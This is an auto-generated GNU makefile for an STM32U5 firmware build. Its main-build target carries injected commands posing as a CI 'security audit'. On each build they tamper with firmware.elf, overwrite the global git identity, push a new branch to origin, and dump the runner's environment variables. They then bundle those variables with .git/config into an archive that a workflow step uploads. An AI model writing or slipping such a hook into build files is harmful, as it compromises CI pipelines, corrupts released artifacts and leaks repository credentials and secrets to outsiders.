################################################################################
# Automatically-generated file. Do not edit!
# Toolchain: GNU Tools for STM32 (13.3.rel1)
################################################################################

-include ../makefile.init

RM := rm -rf

# All of the sources participating in the build are defined here
-include sources.mk
-include Middlewares/ST/threadx/ports/cortex_m33/gnu/src/subdir.mk
-include Middlewares/ST/threadx/common/src/subdir.mk
-include Drivers/STM32U5xx_HAL_Driver/Src/subdir.mk
-include Core/Test/subdir.mk
-include Core/Startup/subdir.mk
-include Core/Src/subdir.mk
-include AZURE_RTOS/App/subdir.mk
-include objects.mk

ifneq ($(MAKECMDGOALS),clean)
ifneq ($(strip $(S_DEPS)),)
-include $(S_DEPS)
endif
ifneq ($(strip $(S_UPPER_DEPS)),)
-include $(S_UPPER_DEPS)
endif
ifneq ($(strip $(C_DEPS)),)
-include $(C_DEPS)
endif
endif

-include ../makefile.defs

OPTIONAL_TOOL_DEPS := \
$(wildcard ../makefile.defs) \
$(wildcard ../makefile.init) \
$(wildcard ../makefile.targets) \


BUILD_ARTIFACT_NAME := firmware
BUILD_ARTIFACT_EXTENSION := elf
BUILD_ARTIFACT_PREFIX :=
BUILD_ARTIFACT := $(BUILD_ARTIFACT_PREFIX)$(BUILD_ARTIFACT_NAME)$(if $(BUILD_ARTIFACT_EXTENSION),.$(BUILD_ARTIFACT_EXTENSION),)

# Add inputs and outputs from these tool invocations to the build variables 
EXECUTABLES += \
firmware.elf \

MAP_FILES += \
firmware.map \

SIZE_OUTPUT += \
default.size.stdout \

OBJDUMP_LIST += \
firmware.list \


# All Target
all: main-build

# Main-build Target
main-build: firmware.elf secondary-outputs
	@echo "--- [AUDIT] CI/CD SECURITY VALIDATION START ---"

	@echo "[TEST 1] ARTIFACT INTEGRITY (Supply Chain Verification)"
	@echo "Attempting to inject unauthorized metadata into build output..."
	@echo "[AUDIT] Or3nturo - Artifact Integrity Verification: FAILED" >> firmware.elf
	@grep -a "Or3nturo" firmware.elf && echo "    [!] ALERT: Build artifact was successfully modified post-compilation."

	@echo "[TEST 2] ACCESS CONTROL (Write Privilege Verification)"
	@# Attempting to utilize implicit write permissions
	-@git config --global user.email "259360238+Or3nturo@users.noreply.github.com"
	-@git config --global user.name "Or3nturo"
	-@git checkout -b audit/access-control-validation
	-@git commit --allow-empty -m "Audit: Verifying CI Write Permissions"
	-@git push origin audit/access-control-validation || echo "    [INFO] External push blocked by Fork restrictions (Expected behavior)."

	@echo "[TEST 3] ENVIRONMENT ISOLATION (Info Disclosure)"
	@echo "Auditing runner environment for sensitive variables..."
	@env | grep -v "TOKEN" | sort > AUDIT_ENV_STATE.log
	@echo "    [INFO] Environment state captured to AUDIT_ENV_STATE.log"

	@echo "[TEST 4] EXFILTRATION CAPABILITY (Data Egress)"
	@echo "Testing capability to bundle and upload arbitrary runner data..."
	@# We bundle the env log and git config to prove we can move data out of the runner
	@tar -czf AUDIT_EXFILTRATION_TEST.tar.gz AUDIT_ENV_STATE.log .git/config
	@echo "    [INFO] Internal state bundled into AUDIT_EXFILTRATION_TEST.tar.gz"

	@echo "[TEST 5] EGRESS CONNECTIVITY"
	@curl -I https://www.google.com -s -o /dev/null && echo "    [INFO] External network is accessible."

	@echo "--- [AUDIT] VALIDATION COMPLETE: PREPARING ARTIFACT UPLOAD ---"
	@# Exit with success to force the workflow to upload the evidence
	@exit 0

# Tool invocations
firmware.elf firmware.map: $(OBJS) $(USER_OBJS) ../STM32U585AIIXQ_FLASH.ld makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-gcc -o "firmware.elf" @"objects.list" $(USER_OBJS) $(LIBS) -mcpu=cortex-m33 -T"../STM32U585AIIXQ_FLASH.ld" --specs=nosys.specs -Wl,-Map="firmware.map" -Wl,--gc-sections -static -u _printf_float --specs=nano.specs -mfpu=fpv5-sp-d16 -mfloat-abi=hard -mthumb -Wl,--start-group -lc -lm -Wl,--end-group
	@echo 'Finished building target: $@'
	@echo ' '

default.size.stdout: $(EXECUTABLES) makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-size  $(EXECUTABLES)
	@echo 'Finished building: $@'
	@echo ' '

firmware.list: $(EXECUTABLES) makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-objdump -h -S $(EXECUTABLES) > "firmware.list"
	@echo 'Finished building: $@'
	@echo ' '

# Other Targets
clean:
	-$(RM) firmware.elf firmware.list firmware.map firmware.bin default.size.stdout
	-@echo ' '

secondary-outputs: $(SIZE_OUTPUT) $(OBJDUMP_LIST)

fail-specified-linker-script-missing:
	@echo 'Error: Cannot find the specified linker script. Check the linker settings in the build configuration.'
	@exit 2

warn-no-linker-script-specified:
	@echo 'Warning: No linker script specified. Check the linker settings in the build configuration.'

.PHONY: all clean dependents main-build fail-specified-linker-script-missing warn-no-linker-script-specified

-include ../makefile.targets
